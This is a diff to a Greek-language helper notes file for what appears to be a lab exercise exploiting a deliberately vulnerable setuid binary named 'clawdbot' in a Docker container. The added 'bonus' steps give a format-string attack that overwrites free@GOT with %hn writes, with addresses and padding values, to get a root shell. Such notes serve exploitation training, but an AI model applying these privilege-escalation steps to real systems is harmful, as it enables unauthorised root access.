@@ -1,5 +1,6 @@
--------------------Βοηθητικό αρχείο----------------------
+----------------------Βοηθητικό αρχείο----------------------------
 
++++++++++++++++++++++ ΜΕ PROCESS FUNCTION +++++++++++++++++++++++++
 1) docker run --rm --privileged -it ethan42/clawdbot:latest bash  
    (κατεβάζω το container)
 
@@ -56,3 +57,20 @@
 
 28) python3 /exploit.py > /tmp/payload
     clawdbot `cat /tmp/payload`
+
++++++++++++++++++++++ ΧΩΡΙΣ PROCESS FUNCTION - BONUS +++++++++++++++++++++++++
+29) nm /usr/sbin/clawdbot | grep free
+         U free@GLIBC_2.0
+    objdump -R /usr/sbin/clawdbot | grep free
+    0804e010 R_386_JUMP_SLOT   free@GLIBC_2.0
+    (βρίσκω τη διεύθυνση του free@GOT = 0x0804e010)
+
+30) overwrite free@GOT (0x0804e010) → all_your_base_are_belong_to_us (0x08049c6d)
+    *(0x0804e010) = 0x08049c6d
+    same two-short-write %hn: hi=0x0804, lo=0x9c6d, pad1=2027, pad2=37993
+    τώρα ΔΕΝ αγγίζουμε τον process pointer
+
+31) python3 /exploit.py bonus > /tmp/payload
+    clawdbot `cat /tmp/payload`
+    (τρέχει ολόκληρο το animation του pretend_to_work() αλλά δίνει root)
+    (όταν καλείται free(message) → execl("/bin/sh") → root shell)
